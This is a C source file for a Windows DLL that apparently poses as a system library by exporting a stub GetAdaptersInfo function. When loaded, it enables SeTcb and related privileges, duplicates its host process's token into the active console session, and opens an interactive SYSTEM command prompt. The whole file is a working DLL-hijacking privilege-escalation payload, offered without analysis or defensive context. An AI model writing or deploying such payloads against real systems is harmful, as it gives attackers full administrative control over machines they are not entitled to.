#include <windows.h>

static void enable_privilege(HANDLE token, const char *name)
{
    TOKEN_PRIVILEGES privileges = {0};

    privileges.PrivilegeCount = 1;
    LookupPrivilegeValueA(NULL, name, &privileges.Privileges[0].Luid);
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(token, FALSE, &privileges, 0, NULL, NULL);
}

static DWORD WINAPI launch_cmd(LPVOID unused)
{
    HANDLE token;
    HANDLE primary = NULL;
    STARTUPINFOA startup = {sizeof(startup)};
    PROCESS_INFORMATION process = {0};
    DWORD session = WTSGetActiveConsoleSessionId();
    char command[] = "cmd.exe /K \"title SYSTEM Command Prompt & whoami\"";

    (void)unused;
    startup.lpDesktop = "winsta0\\default";

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_DUPLICATE,
                          &token)) {
        ExitProcess(1);
    }

    enable_privilege(token, SE_TCB_NAME);
    enable_privilege(token, SE_ASSIGNPRIMARYTOKEN_NAME);
    enable_privilege(token, SE_INCREASE_QUOTA_NAME);

    if (DuplicateTokenEx(token,
                         TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY |
                             TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
                         NULL, SecurityImpersonation, TokenPrimary, &primary) &&
        session != 0xffffffff &&
        SetTokenInformation(primary, TokenSessionId, &session, sizeof(session)) &&
        CreateProcessAsUserA(primary, "C:\\Windows\\System32\\cmd.exe", command,
                             NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL,
                             &startup, &process)) {
        CloseHandle(process.hThread);
        CloseHandle(process.hProcess);
    }

    if (primary != NULL) {
        CloseHandle(primary);
    }
    CloseHandle(token);
    ExitProcess(0);
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)
{
    HANDLE thread;

    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(instance);
        thread = CreateThread(NULL, 0, launch_cmd, NULL, 0, NULL);
        if (thread != NULL) {
            CloseHandle(thread);
        }
    }
    return TRUE;
}

__declspec(dllexport) ULONG WINAPI GetAdaptersInfo(void *info, ULONG *size)
{
    (void)info;
    if (size != NULL) {
        *size = 0;
    }
    return ERROR_NO_DATA;
}
